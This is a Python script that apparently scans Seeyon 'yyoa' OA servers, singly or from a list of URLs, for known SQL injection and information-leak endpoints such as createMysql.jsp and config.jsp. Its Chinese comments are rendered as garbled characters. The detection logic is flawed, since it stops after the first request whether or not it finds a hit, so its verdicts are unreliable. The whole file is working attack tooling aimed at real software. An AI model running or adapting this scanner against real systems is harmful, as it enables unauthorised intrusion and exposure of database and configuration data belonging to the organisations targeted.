import requests

def sqli_exploit(url):
    payload = {1:"/yyoa/common/js/menu/test.jsp?doType=101&S1=",
               2:"/yyoa/ext/trafaxserver/ExtnoManage/isNotInTable.jsp",
               3:"/yyoa/ext/trafaxserver/downloadAtt.jsp?attach_ids=",
               4:"/yyoa/common/selectPersonNew/initData.jsp?trueName=1",
               5:"/yyoa/ext/trafaxserver/ExtnoManage/setextno.jsp?user_ids=",
               6:"/yyoa/docMgr/superviseAndUrge/loadUrgeInfo.jsp?docIds=1",
               7:"/yyoa/checkWaitdo.jsp?userID=1"}
    for a in payload:
        res = requests.get(url + payload[a]) # requests����
        if "<script>" not in res.text and res.status_code is 200:  #�ж�<script>�Ƿ���ڲ���״̬���Ƿ�Ϊ200
            print("[*]:" + url + " | ����ע��©��")
            return  #ֻ��Ҫһ�Σ�����return   �����Ҫȫ����������Ҫreturn����
        else:
            print("[*]:" + url + " | ������ע��©��")
            return #ֻ��Ҫһ�Σ�����return   �����Ҫȫ����������Ҫreturn����
def informantion_exploit(url):
    # �ֵ�洢payload
    payload = {1:"/yyoa/createMysql.jsp",
               2:"/yyoa/ext/createMysql.jsp",
               3:"/yyoa/assess/js/initDataAssess.jsp",
               4:"/yyoa/ext/trafaxserver/SystemManage/config.jsp",
               5:"/yyoa/common/SelectPerson/reloadData.jsp",
               6:"/yyoa/common/selectPersonNew/initData.jsp?trueName=1"}
    for a in payload:  # forѭ�����α����ֵ䣬���ֵ䳤�Ƚ���ѭ��
        res = requests.get(url + payload[a]) # requests����
        if "<script>" not in res.text and res.status_code is 200:  #�ж�<script>�Ƿ���ڲ���״̬���Ƿ�Ϊ200
            print("[*]:" + url + " | ������Ϣй¶©��")
            return  #ֻ��Ҫһ�Σ�����return   �����Ҫȫ����������Ҫreturn����
        else:
            print("[*]:" + url + " | ��������Ϣй¶©��")
            return #ֻ��Ҫһ�Σ�����return   �����Ҫȫ����������Ҫreturn����

def run(url):  # ���Ϻ���
    sqli_exploit(url)
    informantion_exploit(url)

if __name__ == '__main__':

    while True:
        go = input("(1) ������� (2) ������� (exit) �˳�����")
        if go == 'exit': # �ж������Ƿ�Ϊexit
            break
        elif go == "1":  # �ж������Ƿ�Ϊ1
            url = input("Please enter url:")
            if url[:4] != 'http':    #�ж�url�Ƿ���http
                url = 'http://' + url  # û������룬��ֱ�ӿ�ʼ
            run(url)
        elif go == "2": # �ж������Ƿ�Ϊ2
            filepath = input("FilePath:")
            url_list = open(filepath)
            new_url_list = url_list.readlines()
            for url in new_url_list:
                url = url.strip() #ȥ���ո�
                try:
                    run(url)
                except Exception as e: # �׳��쳣
                    print(e)
                    pass
        else: # û�����ض���ֵ��ظ�
            print("����ôϹ��������")   #���Լ���return����������
